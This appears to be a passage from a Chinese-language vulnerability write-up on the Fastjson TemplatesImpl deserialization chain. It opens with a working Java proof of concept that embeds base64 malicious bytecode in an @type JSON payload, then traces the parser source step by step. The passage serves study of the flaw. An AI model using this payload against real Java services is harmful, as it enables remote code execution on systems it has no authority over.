                cc.setName(randomClassName);
                cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
                try {
                    byte[] evilCode = cc.toBytecode();
                    String evilCode_base64 = Base64.encodeBase64String(evilCode);
                    final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
                    String text1 = "{"+
                            "\"@type\":\"" + NASTY_CLASS +"\","+
                            "\"_bytecodes\":[\""+evilCode_base64+"\"],"+
                            "'_name':'a.b',"+
                            "'_tfactory':{ },"+
                            "'_outputProperties':{ }"+
                            "}\n";
                    System.out.println(text1);
                    ParserConfig config = new ParserConfig();
                    Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
    }
使用Javassist动态生成恶意类放到`_bytecodes`中。这里发现几个问题，
  1. 如果是只对`_bytecodes`插入恶意代码为什么需要构造这么多的值。
  2. `_bytecodes`中的值为什么需要进行Base64加密。
  3. 在反序列化的时候为什么要加入`Feature.SupportNonPublicField`参数值。
  * @type ：用于存放反序列化时的目标类型，这里指定的是`TemplatesImpl`这个类，Fastjson会按照这个类反序列化得到实例，因为调用了`getOutputProperties`方法，实例化了传入的bytecodes类，导致命令执行。需要注意的是，Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入`Feature.SupportNonPublicField` 在parseObject中才能触发；
  * _bytecodes：继承`AbstractTranslet` 类的恶意类字节码，并且使用`Base64`编码
  * _name：调用`getTransletInstance` 时会判断其是否为null，为null直接return，不会往下进行执行，利用链就断了，可参考cc2和cc4链。
  * _tfactory：`defineTransletClasses` 中会调用其`getExternalExtensionsMap` 方法，为null会出现异常,但在前面分析jdk7u21链的时候，部分jdk并未发现该方法。
  * outputProperties：漏洞利用时的关键参数，由于Fastjson反序列化过程中会调用其`getOutputProperties` 方法，导致`bytecodes`字节码成功实例化，造成命令执行。
前面说到的之所以加入`Feature.SupportNonPublicField`才能触发是因为`Feature.SupportNonPublicField`的作用是支持反序列化使用非public修饰符保护的属性，在Fastjson中序列化private属性。
来查看一下`TemplatesImpl`。
这里可以看到这几个成员变量都是private进行修饰的。不使用`Feature.SupportNonPublicField`参数则无法反序列化成功，无法进行利用。
由此可见Fastjson中使用`TemplatesImpl`链的条件比较苛刻，因为在Fastjson中需要加入`Feature.SupportNonPublicField`，而这种方式并不多见。
## 0x03 Fastjson TemplatesImpl链 反序列化漏洞分析
下断点开始跟踪漏洞
    public static  T parseObject(String input, Type clazz, ParserConfig config, Feature... features) {
            return parseObject(input, clazz, config, (ParseProcess)null, DEFAULT_PARSER_FEATURE, features);
        }
这里有几个参数传入，并直接调用了`parseObject`的重载方法。
几个参数分别是input、clazz、config、features。
input传递进来的是需要反序列化的数据，这里即是我们的payload数据。
clazz为指定的对象，这里是Object.class对象
config则是ParserConfig的实例对象
features参数为反序列化反序列化private属性所用到的一个参数。
实例化了一个`DefaultJSONParser`，并调用`parseObject`方法，跟踪`parseObject`。
调用`derializer.deserialze`方法进行跟踪。
来看到这一段代码，这里是个三目运算，type是否为Class对象并且type不等于 `Object.class`，type不等于
`Serializable.class`条件为true调用`parser.parseObject`,条件为flase调用`parser.parse`。很显然这里会调用`parser.parse`方法。继续跟踪。
这里将`this.lexer`的值，赋值给lexer，而这个`this.lexer`是在实例化`DefaultJSONParser`对象的时候被赋值的。回看我们代码中的`DefaultJSONParser`被创建的时候。
    public DefaultJSONParser(String input, ParserConfig config, int features) {
        this(input, new JSONScanner(input, features), config);
    }
调用重载方法
    public DefaultJSONParser(Object input, JSONLexer lexer, ParserConfig config) {
        this.dateFormatPattern = JSON.DEFFAULT_DATE_FORMAT;
        this.contextArrayIndex = 0;
        this.resolveStatus = 0;
        this.extraTypeProviders = null;
        this.extraProcessors = null;
        this.fieldTypeResolver = null;
        this.lexer = lexer;
        this.input = input;
        this.config = config;
        this.symbolTable = config.symbolTable;
        int ch = lexer.getCurrent();
        if (ch == '{') {
            lexer.next();
            ((JSONLexerBase)lexer).token = 12;
        } else if (ch == '[') {
            lexer.next();
            ((JSONLexerBase)lexer).token = 14;
        } else {
            lexer.nextToken();
        }
    }
这里面去调用 `lexer.getCurrent()`跟踪代码发现就是从lexer返回ch的值。而下面的这段代码
    int ch = lexer.getCurrent();
        if (ch == '{') {
            lexer.next();
            ((JSONLexerBase)lexer).token = 12;
        } else if (ch == '[') {
            lexer.next();
            ((JSONLexerBase)lexer).token = 14;
        } else {
            lexer.nextToken();
        }
调用`lexer.getCurrent()`，获取到是ch中数据如果为`{`就将`lexer.token`设置为12，如果为`[`设置
`lexer.token`设置为14。
调用`lexer.getCurrent()`，获取当前字符这里获取到的是双引号。lexer这个是`JSONScanner`实例化对象，里面存储了前面传入的Json数据，但是这里疑问又来了，既然是Json的数据，那么前面的`{`去哪了呢？为什么这里获取到的不是这个`{`花括号。
还记得我们前面加载`DefaultJSONParser`重载方法的时候`new JSONScanner()`,跟踪查看他的构造方法就知道了
    public JSONScanner(String input, int features) {
            super(features);
            this.text = input;
            this.len = this.text.length();
            this.bp = -1;
            this.next();
            if (this.ch == '\ufeff') {
                this.next();
            }
        }
构造方法里面调用了`this.next();`
    public final char next() {
            int index = ++this.bp;
            return this.ch = index >= this.len ? '\u001a' : this.text.charAt(index);
        }
返回`com.alibaba.fastjson.parser.DefaultJSONParser#parse`进行跟踪代码。
    public Object parse(Object fieldName) {
            JSONLexer lexer = this.lexer;
            switch(lexer.token()) {
            case 1:
            case 5:
            case 10:
            case 11:
            case 13:
            case 15:
            case 16:
            case 17:
            case 18:
            case 19:
            ...
            case 12:
            JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
            return this.parseObject((Map)object, fieldName);
通过刚刚的分析得知这里的`lexer.token()`等于12会走到`case 12:`这里
调用`this.parseObject`继续跟踪
这里可以看到获取下一个字符是否为双引号，而后去调用`lexer.scanSymbol`方法进行提取对应内容数据。
查看一下参数`this.symbolTable`。
这里则是提取了`@type`
接着走到这个地方
    if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
        ref = lexer.scanSymbol(this.symbolTable, '"');
        Class clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader());
判断key是否等于`@type`,等于则获取`@type`中的值，接着则是调用反射将这个类名传递进去获取一个方法获取类对象。
下面走到这段代码
    ObjectDeserializer deserializer = this.config.getDeserializer(clazz);
     thisObj = deserializer.deserialze(this, clazz, fieldName);
跟踪，加载两次重载来到这里
上面的代码中直接就获取到了`outputProperties`跟踪一下，`sortedFieldDeserializers.fieldInfo`是怎么被赋值的。
查看发现是在构造方法被赋值的，也就是实例化对象的时候
    public JavaBeanDeserializer(ParserConfig config, JavaBeanInfo beanInfo) {
        this.clazz = beanInfo.clazz;
        this.beanInfo = beanInfo;
        this.sortedFieldDeserializers = new FieldDeserializer[beanInfo.sortedFields.length];
        int i = 0;
        int size;
        FieldInfo fieldInfo;
        FieldDeserializer fieldDeserializer;
        for(size = beanInfo.sortedFields.length; i < size; ++i) {
            fieldInfo = beanInfo.sortedFields[i];
            fieldDeserializer = config.createFieldDeserializer(config, beanInfo, fieldInfo);
            this.sortedFieldDeserializers[i] = fieldDeserializer;
        }
返回上层，`JavaBeanDeserializer`是在`this.config.getDeserializer`被创建的，跟进一下
    return this.getDeserializer((Class)type, type);
⬇
    derializer = this.createJavaBeanDeserializer(clazz, (Type)type);
⬇
    beanInfo = JavaBeanInfo.build(clazz, type, this.propertyNamingStrategy);
⬇
    boolean match = this.parseField(parser, key, object, type, fieldValues);
接着来到了`com.alibaba.fastjson.util.JavaBeanInfo#build`
下面有几个关键代码
在通过`@type`获取类之后，通过反射拿到该类所有的方法存入methods，接下来遍历methods进而获取get、set方法
set的查找方式：
  1. 方法名长度大于4
  2. 非静态方法
  3. 返回值为void或当前类
  4. 方法名以set开头
  5. 参数个数为1
get的查找方式：
  1. 方法名长度大于等于4
  2. 非静态方法
  3. 以get开头且第4个字母为大写
  4. 无传入参数
  5. 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong
这样一来就获取到了`TemplatesImpl`的`getOutputProperties()`
返回`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze`继续调试跟踪
前面都是重复的内容，遍历去获取json中的内容。
直接定位到这一步进行跟踪
替换`_`字符为空
执行完成后回到 `com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#
parseField`来到这一步
进行反射调用执行`TemplatesImpl`的`getOutputProperties()`方法。
接着则来到了这里
    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
        _indentNumber, _tfactory);
到了这里其实也就不用跟了，和前面的JDK7u21后半段的链是一样的。
在这命令就执行成功了，但是我们还有一个遗留下来的问题没有解答，就是`_bytecodes`为什么需要进行base64编码的问题，也是分析的时候跟踪漏了。
返回`com.alibaba.fastjson.parser.DefaultJSONParser#parseObject`查看
在解析byte数据的时候回去调用`this.lexer.bytesValue();`,跟踪就会看见会调用`IOUtils.decodeBase64`进行base64解密
贴出调用链
## 0x04 结尾
看到网上部分分析文章，分析漏洞只分析了几个点。直接就在某个地方下断点，然后跳到某一个关键位置的点进行分析，很多数据的流向都不清楚是怎么来的。所以漏洞的一些细节都没去进行了解过，所以漏洞真的分析清楚了嘛？